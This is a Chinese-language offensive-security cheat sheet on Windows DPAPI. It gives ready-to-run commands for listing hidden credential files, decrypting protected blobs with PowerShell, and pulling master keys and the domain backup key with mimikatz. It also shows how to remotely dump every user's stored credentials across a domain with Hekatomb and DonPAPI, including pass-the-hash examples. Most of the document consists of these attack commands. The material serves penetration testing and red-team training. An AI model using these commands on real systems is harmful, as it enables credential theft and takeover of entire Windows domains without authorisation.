# Windows - DPAPI

> 在Windows系统中，保存在Windows凭据管理器中的凭据使用微软的数据保护API进行加密，并作为“blob”文件存储在用户的AppData文件夹中。

## 概述

* [数据保护API](#data-protection-api)
  * [列出凭据文件](#list-credential-files)
  * [DPAPI本地机器上下文](#dpapi-localmachine-context)
  * [Mimikatz - 凭据管理器和DPAPI](#mimikatz---credential-manager--dpapi)
  * [Hekatomb - 窃取域中所有凭据](#hekatomb---steal-all-credentials-on-domain)
  * [DonPAPI - 远程转储DPAPI凭据](#donpapi---dumping-dpapi-credz-remotely)

## 数据保护API

* 在域外：使用用户的`密码哈希`来加密这些“blobs”。
* 在域内：使用`域控制器的主密钥`来加密这些blobs。

通过提取域控制器的私钥，可以解密所有的blobs，因此可以恢复域中所有工作站Windows识别管理器中记录的所有秘密。

```ps1
vaultcmd /list

VaultCmd /listcreds:<namevault>|<guidvault> /all
vaultcmd /listcreds:"Windows Credentials" /all
```

### 列出凭据文件

```ps1
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

### DPAPI本地机器上下文

`本地机器`上下文用于保护打算在同一台机器上的不同用户或服务之间共享的数据。这意味着任何在机器上运行的用户或服务都可以使用适当的凭据访问受保护的数据。

相比之下，`当前用户`上下文用于保护只有加密它的用户才打算访问的数据，且不能被同一台机器上的其他用户或服务访问。

```ps1
$a = [System.Convert]::FromBase64String("AQAAANCMnd[...]")
$b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
[System.Text.Encoding]::ASCII.GetString($b)
```

### Mimikatz - 凭据管理器和DPAPI

```powershell
# 检查文件夹以查找凭据
dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*

# 使用mimikatz检查文件
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
# 查找主密钥
mimikatz !sekurlsa::dpapi
# 使用主密钥
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b

# 查找并导出备份密钥
lsadump::backupkeys /system:dc01.lab.local /export
# 使用备份密钥
dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```

### Hekatomb - 窃取域中所有凭据

> [Processus-Thief/Hekatomb](https://github.com/Processus-Thief/HEKATOMB) 是一个Python脚本，它连接到LDAP目录以检索所有计算机和用户信息。然后，它将从所有计算机下载所有用户的DPAPI blob。最后，它将提取域控制器的私钥，通过RPC使用它来解密所有凭据。

```python
pip3 install hekatomb
hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
```

![内存中的数据](https://github.com/Processus-Thief/HEKATOMB/raw/main/.assets/github1.png)

### DonPAPI - 远程转储DPAPI凭据

* [login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)

```ps1
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target

# 使用域备份密钥
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
```

## 参考资料

* [DPAPI - 提取密码 - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
* [DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 2022年3月4日](https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/)